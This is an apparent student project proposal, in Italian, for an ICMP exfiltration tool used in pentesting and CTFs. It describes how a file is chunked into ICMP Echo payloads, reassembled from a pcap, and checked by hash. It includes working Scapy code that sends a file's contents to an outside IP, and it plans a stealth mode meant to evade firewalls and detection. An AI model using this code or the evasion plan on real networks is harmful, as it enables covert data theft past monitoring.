
---
Autori: Marco Soffia, Atef Jmai

```
python3 tool.py --send --protocol <ICMP> --file <file.txt> --remote <ip>
```

```
python3 tool.py --read <data.pcap>
```

#### ICMP Exfiltration tool 

Tool utile per pentester, CTF builders (nascondere la flag in una connessione), elusione di firewall.

Questo tool permette di studiare, in un contesto di laboratorio, come informazioni arbitrarie possano essere trasportate dentro traffico ICMP e poi ricostruite da una cattura di rete.

Il file viene letto come bytes, diviso in chunk e inviato dentro pacchetti ICMP Echo. Il tool presenta una modalità `--send` che costruisce la trasmissione verso un IP remoto tramite il protocollo definito.

La flag `--read` permette di identificare in un `.pcap` i pacchetti appartenenti alla stessa sessione, ricostruire lo stream, rigenerare il file originale e mostrare eventuali errori, duplicati o chunk mancanti.

#### a chi serve
Tool utile per pentester, CTF builders (nascondere la flag in una connessione), elusione di firewall. Non è un tool istantaneo: si pensa sul "lungo tempo".

#### Competenze del corso
Networking, encoding, crypto, properties, offensive, eccezioni e errori, math. 

#### Implementazione
La trasmissione è composta da tre tipi logici di frame:

- `META`: descrive la trasmissione, quindi numero di chunk, chunk size, dimensione totale, hash SHA-256 e versione del formato;
- `DATA`: contiene un chunk grezzo del file;
- `END`: opzionale, conferma la fine dello stream o ripete l'hash finale.

I file vanno suddivisi in chunk perché la dimensione del payload ICMP è limitata. Inoltre ICMP non garantisce consegna, ordine o ritrasmissione: per questo il tool deve supportare almeno una strategia di ridondanza, ad esempio inviando più volte gli stessi frame.

#### Classi:

**1. Frame**  
Frame è il pacchetto logico applicativo interno, usato per rappresentare META, DATA o END prima della creazione del pacchetto ICMP.

**2. MetaData**  
MetaData contiene le informazioni della trasmissione: numero di chunk, chunk size, dimensione del file, hash e versione del protocollo.

**3. Chunker**  
Responsabilità singola: divide il file in chunk di bytes.

**4. Reassembler**  
Responsabilità: ricostruisce il file ordinando i chunk ricevuti e gestendo duplicati o chunk mancanti.

**5. Codec**  
Responsabilità: serializzare/deserializzare il pacchetto META; i DATA restano bytes grezzi nel payload.

**6. IntegrityService**  
Responsabilità: calcolo e verifica dell’hash del file originale e del file ricostruito.

**7. IcmpPacketBuilder**  
Questa classe usa Scapy, ma resta isolata; crea pacchetti `IP/ICMP/Raw` partendo da un Frame.

**8. TransmissionStrategy**  
Le sottoclassi decidono in che ordine e con quanta ridondanza mandare i frame.

**9. RedundantStrategy**  
Sottoclasse di TransmissionStrategy: manda più volte lo stesso frame prima di passare al successivo.

**10. InterleavedStrategy**  
Sottoclasse di TransmissionStrategy: manda tutti i frame in ordine e poi ripete il giro più volte.

**11. SenderEngine**  
Coordina lettura file, chunking, creazione frame, strategia di invio e costruzione pacchetti ICMP.

**12. ReceiverEngine**  
Coordina lettura `.pcap`, estrazione frame, deduplica, ricostruzione file e verifica hash.

#### Gerarchia: 
TransmissionStrategy 

`TransmissionStrategy`
-  `RedundantStrategy`: 0,0,0,1,1,1,2,2,2
-  `InterleavedStrategy`: 0,1,2,0,1,2,0,1,2
-  `ParityStrategy`: 0, 1, p, 2, 3, p, 4, 5, p 
#### Step di esecuzione

Sender
1. Lettura del file come bytes
2. Divisione del file in chunk
3. Calcolo dei metadati: numero di chunk, chunk size, file size, SHA-256 e session_id
4. Creazione dei frame META, DATA ed eventuale END
5. Costruzione dei pacchetti ICMP con `ICMP.id`, `ICMP.seq` e `Raw.load`
6. Invio dei pacchetti tramite strategia di ridondanza

Reader
1. Legge i pacchetti da una conversazione `.pcap`
2. Filtra i pacchetti della stessa sessione tramite `ICMP.id`
3. Classifica META, DATA ed eventuale END usando `ICMP.seq`
4. Deduplica i DATA ripetuti
5. Ricostruisce il file ordinando i chunk
6. Verifica lo SHA-256 del file ricostruito rispetto all'hash dichiarato nel META

#### Piano di massima
A metà percorso contiamo di avere:
- Un PoC funzionante con una strategy

Dopo:
- Fine implementazione delle strategy
- Modalità stealth

### Ipotesi realistica

Su una rete Ethernet classica, considerando una MTU di 1500 byte:

| Componente | Dimensione |
|---|---:|
| MTU Ethernet | 1500 byte |
| Header IPv4 | -20 byte |
| Header ICMP | -8 byte |
| **Payload ICMP massimo** | **1472 byte** |

In teoria, quindi, un pacchetto ICMP Echo può trasportare fino a circa **1472 byte** di payload.

Nel nostro caso i DATA sono dati grezzi: il chunk viene inserito direttamente in `Raw.load`, senza JSON e senza Base64. I metadati applicativi non stanno dentro ogni pacchetto DATA, ma nei pacchetti META.

Il META può essere un JSON compatto con campi come:

- `n_chunks`
- `chunk_size`
- `file_size`
- `sha256`
- `version`

Questo riduce l'overhead rispetto a serializzare ogni chunk dentro un frame JSON. Nei DATA il chunk utile può quindi avvicinarsi al payload ICMP massimo, lasciando solo un margine prudenziale per evitare frammentazione e problemi legati alla rete o alla libreria usata.

Possiamo quindi distinguere tre profili:

| Scenario | Chunk utile | Obiettivo |
|---|---:|---|
| Conservativo | **512 byte** | semplice da testare, tanti pacchetti |
| Bilanciato | **1024 byte** | meno pacchetti, ancora prudente |
| Ottimizzato | **1300-1400 byte** | usa quasi tutto lo spazio utile del DATA |

---

### Formula

Per un file di dimensione `S`:

$$
nChunk = \lceil \frac{S}{chunkSize} \rceil
$$

Nel profilo ottimizzato, `chunkSize` deriva dal payload ICMP disponibile:

$$
payloadMax = MTU - headerIPv4 - headerICMP
$$

Con Ethernet classica:

$$
payloadMax = 1500 - 20 - 8 = 1472
$$

Dato che i DATA contengono bytes grezzi, possiamo scegliere:

$$
chunkSize = payloadMax - margine
$$

Ad esempio, con un margine prudenziale di circa 72 byte:

$$
chunkSize = 1472 - 72 = 1400
$$

Poi aggiungiamo almeno un pacchetto META. Il pacchetto END è opzionale:

$$
frameBase = nChunk + nMeta + nEnd
$$

Nel caso base:

$$
nMeta = 1,\quad nEnd = 0
$$

Con ridondanza `R`:

$$
pacchettiTotali = frameBase \times R
$$

Dove:

| Variabile | Significato |
|---|---|
| `S` | dimensione del file in byte |
| `chunkSize` | dimensione utile di ogni chunk |
| `payloadMax` | payload massimo teorico ICMP |
| `margine` | spazio lasciato libero per evitare problemi pratici |
| `nChunk` | numero di chunk dati |
| `nMeta` | numero di pacchetti META |
| `nEnd` | numero di pacchetti END opzionali |
| `frameBase` | numero di frame DATA + META + END |
| `R` | fattore di ridondanza |
| `pacchettiTotali` | numero totale di pacchetti/frame da trasmettere |

---

### Esempio: documento da 1 MB con chunk ottimizzato

Consideriamo un documento da 1 MB:

$$
1\,MB = 1.048.576\,byte
$$

Con chunk da 1400 byte:

$$
\lceil \frac{1.048.576}{1400} \rceil = 749 \, chunk
$$

Aggiungendo un pacchetto META obbligatorio e nessun END:

$$
frameBase = 749 + 1 = 750
$$

Se decidiamo di inviare anche un END, `frameBase` diventa `751`.

| Ridondanza | Pacchetti totali |
|---:|---:|
| 1x | 750 |
| 2x | 1.500 |
| 3x | 2.250 |
| 5x | 3.750 |

---

### Stima dei tempi

Per stimare il tempo di trasmissione dobbiamo decidere quanti pacchetti al secondo inviare.

La formula è:

$$
tempoSecondi = \frac{pacchettiTotali}{pacchettiPerSecondo}
$$

#### Documento da 1 MB, chunk da 1400 byte

Questo è il caso ottimizzato: usa DATA raw e riduce molto il numero di pacchetti rispetto al chunk da 512 byte.

| Ridondanza | Pacchetti | 10 pps | 50 pps | 100 pps |
|---:|---:|---:|---:|---:|
| 1x | 750 | 75 s | 15 s | 7,5 s |
| 2x | 1.500 | 150 s | 30 s | 15 s |
| 3x | 2.250 | 225 s | 45 s | 22,5 s |
| 5x | 3.750 | 375 s | 75 s | 37,5 s |

---

### Considerazioni

Ragionando solo su file `.txt`, un file da **1 MB** è già molto grande.

Per file più grandi, il numero di pacchetti cresce rapidamente, soprattutto usando ridondanza.

Una configurazione realistica per il progetto potrebbe essere:

| Parametro             | Valore consigliato |
| --------------------- | -----------------: |
| `chunkSize`           |  1024 - 1400 byte |
| `ridondanza`          |            2x o 3x |
| `pacchettiPerSecondo` |          30-80 pps |

- Puntiamo ad avere una versione utilizzabile e poi guadagnare dove possibile in pps e chunk size

### Concetto di base in codice
``` Python
from scapy.all import IP, ICMP, Raw, send  
import time  
  
DST = "8.8.8.8"  
CHUNK_SIZE = 1024  
ICMP_ID = 532  
  
with open("file.txt", "r") as f:  
    text = f.read()  
  
text_bytes = text.encode("utf-8")  
  
chunks = [  
    text_bytes[i:i + CHUNK_SIZE] for i in range(0, len(text_bytes), CHUNK_SIZE)  
]  
  
for seq, chunk in enumerate(chunks):  
    packet = (  
        IP(dst=DST)  
        / ICMP(type=8, code=0, id=ICMP_ID, seq=seq)  
        / Raw(load=chunk)  
    )  
  
    packet.show()  
    send(packet, verbose=False)  
  
    time.sleep(0.05)
```
### Modalità stealth 

In una fase successiva possiamo aggiungere una modalità configurabile orientata a dilatare la trasmissione nel tempo e rendere il traffico meno concentrato.

Questa modalità non cambia il formato dei pacchetti: cambia solo come vengono pianificati e inviati.

Parametri possibili:

- `chunkSize`: può scendere rispetto al profilo ottimizzato;
- `pacchettiPerSecondo`: limita il rate medio;
- `delayMin` / `delayMax`: introduce pause variabili tra pacchetti;
- `jitter`: evita intervalli perfettamente regolari;
- `burstSize`: limita quanti pacchetti inviare consecutivamente;
- `quietWindow`: inserisce pause più lunghe tra gruppi di pacchetti;
- `entropia`: aggiungiamo padding per abbassare l'entropia del pacchetto.

### Ore da dedicarci
Dedicandoci circa 10+ ore a settimana entrambi contiamo di riuscire a presentare una versione funzionante, completa / funzionante con buona parte delle feature previste.
